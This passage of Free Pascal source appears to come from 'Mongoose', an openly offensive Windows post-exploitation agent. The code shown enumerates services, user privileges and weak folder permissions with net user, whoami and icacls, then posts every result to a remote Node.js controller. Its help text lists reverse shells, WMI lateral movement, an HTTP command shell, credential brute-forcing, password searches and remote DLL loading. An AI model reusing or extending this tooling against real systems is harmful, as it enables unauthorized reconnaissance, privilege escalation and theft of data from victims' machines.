  SERVICE_DRIVERL := Tstringlist.Create;
  SERVICE_INTERACTIVE_PROCESSL := Tstringlist.Create;


  ServiceGetList('',SERVICE_WIN32, SERVICE_ACTIVE,SERVICE_WIN32L);
  writeln('[+] Active Win32 Services ');

  writeln(SERVICE_WIN32L.Text);
   postRequest(' <font color="lightgreen"><b>[*] Active Win32 Services </b></font> '+SERVICE_WIN32L.Text,ip,os,'10');
  ServiceGetList('',SERVICE_ADAPTER, SERVICE_ACTIVE,SERVICE_ADAPTERL);
  writeln('[+] Active Adapter Services ');

  writeln(SERVICE_ADAPTERL.Text);
  postRequest(' <font color="lightgreen"><b>[*] Active Adapter Services </b></font>'+SERVICE_ADAPTERL.Text,ip,os,'10');
  ServiceGetList('',SERVICE_DRIVER, SERVICE_ACTIVE,SERVICE_DRIVERL);
  writeln('[+] Active Driver Services ');

  writeln(SERVICE_DRIVERL.Text);
  postRequest(' <font color="lightgreen"><b>[*] Active Driver Services </b></font> '+SERVICE_DRIVERL.Text,ip,os,'10');
  ServiceGetList('',SERVICE_INTERACTIVE_PROCESS, SERVICE_ACTIVE,SERVICE_INTERACTIVE_PROCESSL);
  writeln('[+] Active Interactive Process Services ');

  writeln(SERVICE_INTERACTIVE_PROCESSL.Text);
   postRequest(' <font color="lightgreen"><b>[*] Active Interactive Process Services </b></font>'+SERVICE_INTERACTIVE_PROCESSL.Text,ip,os,'10');
  //Freeing Tstringlist
  SERVICE_WIN32L.Free;
  SERVICE_ADAPTERL.free;
  SERVICE_DRIVERL.free;
  SERVICE_INTERACTIVE_PROCESSL.free;

 end;

procedure Tmongoose.userinfo;
var
    process : Tprocess;
    i:integer;
    cmd,cmd2,cmd3,output,outap: string;
    list,outp : Tstringlist;
    OutputStream : TStream;
    BytesRead    : longint;
    key,key2 : string;
    Buffer       : array[1..BUF_SIZE] of byte;
    ip,os:string;
begin

  ip :=getlocalip;     //retrieve host ip address for all unix system
  os := osver;     //retrieve operating system  os


 Writeln('[+]  Check User Group Level ');
 Writeln(Format('Current user is Admin !       %s',[BoolToStr(UserInGroup(DOMAIN_ALIAS_RID_ADMINS),True)]));
 Writeln(Format('Current user is Guest  !      %s',[BoolToStr(UserInGroup(DOMAIN_ALIAS_RID_GUESTS),True)]));
 Writeln(Format('Current user is Power User !   %s',[BoolToStr(UserInGroup(DOMAIN_ALIAS_RID_POWER_USERS),True)]));
  postRequest('[*] Current user is Admin !? '+BoolToStr(UserInGroup(DOMAIN_ALIAS_RID_ADMINS)),ip,os,'13');
  postRequest('[*] Current user is Guest !? '+BoolToStr(UserInGroup(DOMAIN_ALIAS_RID_GUESTS)),ip,os,'13');
  postRequest('[*] Current user is Power User !? '+BoolToStr(UserInGroup(DOMAIN_ALIAS_RID_POWER_USERS)),ip,os,'13');
  cmd  := 'net user';
   cmd2 := 'whoami /priv';

   list := Tstringlist.Create;
   outp := Tstringlist.Create;

   list.Add(cmd);
   list.Add(cmd2);

   process := Tprocess.Create(nil);
   OutputStream := TMemoryStream.Create;    // we are going to store outputs as memory stream .
   process.Executable:=systemfolder+'\cmd.exe';
   process.Options:= [poUsePipes,poStderrToOutPut];
   for i:=0 to list.Count-1 do begin
   try
   process.CommandLine:=list[i];
   process.Execute;
   except
   on E: exception do
    writeln(E.Message);
      end;
   repeat
    // Get the new data from the process to a maximum of the buffer size that was allocated.
    // Note that all read(...) calls will block except for the last one, which returns 0 (zero).
      BytesRead := Process.Output.Read(Buffer, BUF_SIZE);
      OutputStream.Write(Buffer, BytesRead)
    until BytesRead = 0;    //stop if no more data is being recieved
    outputstream.Position:=0;
    outp.LoadFromStream(outputstream);
    end;
      writeln('[+] Current System Users With Privileges   : ',outp.Text);
       postRequest(' <font color="red"><b>[*] Current System Users With Privileges </b></font>'+outp.Text,ip,os,'13');

      writeln('[+] Net Local Users and Groups overview ');
      outap :=runit('net localgroup');
      writeln(outap);
      postRequest(' <font color="lightgreen"><b> [*] Net Local Users and Groups overview </b></font>'+outap,ip,os,'13');
   // end;
    process.free;
    list.Free;
    outp.Free;
// end;
  // end;
  end;
 procedure Tmongoose.acl;
 var
  res:boolean;
  outres : Tstringlist;
  path ,f,m,ff,mm,fff,ffff,mmm,mmmm,os,ip: string;
  i :integer;
begin
  ip :=getlocalip;     //retrieve host ip address for all unix system
  os := osver;     //retrieve operating system  os

   f := runit('icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"');
   ff := runit('icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"');
   fff := runit('icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" ');
   ffff:= runit('icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"');

   mm :=runit('icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"');
   mmm:=runit('icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"');
   mmmm :=runit('icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"');
   m := runit('icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"');

   //
   Writeln('[+] Full Permission for Every One Level > ',f,ff);
   postRequest('[*] Full Permission for Every One Level > '+f,ip,os,'15');
   postRequest('[*] Full Permission for Every One Level > '+ff,ip,os,'15');
   writeln('===========================================');
   writeln('[+]Full Permission For BUILTIN\Users Level > ',fff,ffff);
   postRequest('[*] Full Permission for BUILTIN\Users Level > '+fff,ip,os,'15');
   postRequest('[*] Full Permission for BUILTIN\Users Level > '+ffff,ip,os,'15');
   writeln('===========================================');
   writeln('[+] Modify Permission For EveryOne Level > ',mm,mmm);
   postRequest('[*] Modify Permission For EveryOne Level > '+mm,ip,os,'15');
   postRequest('[*] Modify Permission For EveryOne Level > '+mmm,ip,os,'15');
   writeln('===========================================');
   Writeln('[+] Modify Permission For BUILTIN\Users > ',m,mmmm);
   postRequest('[*] Modify Permission For BUILTIN\Users Level > '+m,ip,os,'15');
   postRequest('[*] Modify Permission For BUILTIN\Users Level > '+mmmm,ip,os,'15');
   writeln('===========================================');


  Writeln('[+] Executing Access Check For Writable Folders With Current Level..... ');
  path :='C:\';
  outres:= Tstringlist.Create;
   try
  FindAllDirectories(outres,path,True);
  for i := 0 to outres.Count -1 do begin

  res := WritableDir(outres.strings[i]);
  if (res = true) then begin
   writeln(outres.Strings[i]);
   postRequest(' <font color="lightgreen"><b>[*] Access Check For Writable Folders With Current Level > </b></font>'+outres.Strings[i],ip,os,'15');

end;
  end;
    except
   on E: exception do
    writeln('[i] Some of Locations flaged as :',E.Message);
      end;
   end;


constructor Tmongoose.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:=True;
end;

destructor Tmongoose.Destroy;
begin
  inherited Destroy;
end;

procedure Tmongoose.WriteHelp;
begin
  { add your help code here }
  writeln('Usage: ', ExeName, ' -h');

  writeln('-s',' --retrieve windows services and installed drivers.');
  writeln('-u',' --retrieve information about Users, groups, roles. ');
  writeln('-c',' --search connected drivers for senstive config files by extension. ');
  writeln('-n',' --retrieve network information,network interfaces, connection details.');
  writeln('-w',' --enumerate for writeable directories, access permission Check, modified permissions. ');
  writeln('-i',' --enumerate windows system information, Sessions, Always elvated check.');
  writeln('-l',' --search in any file for specific string , ex : agent.exe -l c:\ password *.config. ');
  writeln('-o',' --specify host address of nodejs application. ');
  writeln('-p',' --enumerate installed Softwares, Running Processes, Tasks. ');
  Writeln('-e',' --kernel inspection Tool, it will help to search through tool databases for windows kernel vulnerabilities');
  writeln('-x',' --password to authorize your connection with node js application. ');
  Writeln('-d',' --download Files directly into target machine.');
  Writeln('-t',' --upload Files From target machine into node js application.');
  Writeln('-m',' --run all known scan Types together.');
  writeln(' ' );
  writeln('[!] RED TEAMING TACTICS SECTION ');
  writeln (' ');
  writeln('-r',' --spawn a reverse shell with specific account.');
  writeln('-lr',' --Lateral movement technique using WMI (e.g -lr -host 192.168.14.1 -username administrator -password blabla -srvhost nodejsip )');
  writeln('-nds',' --network discovery and share enumeration ');
  writeln('-cmd',' --transfer commands via HTTP Shell ');
  writeln('-interactive',' --starting interactive mode (eg : loading plugins ..etc) ');
  writeln('-username',' --identity authentication for specific attack modules.');
  writeln('-password',' --identity authentication for specific attack modules.');
  writeln('-host',' --identify remote host to conduct an attack to.');
  writeln('-srvhost',' --set rhost of node js application.');
  writeln('-bf',' --local users / domain users bruteforce module ');
  writeln('-import',' --import and execute dll file locally ');
  writeln('-remote',' --import and execute dll file from remote host ');

end;

var
  Application: Tmongoose;
begin
  Application:=Tmongoose.Create(nil);
  Application.Title:='Mongoose';
  Application.Run;
  Application.Free;
end.

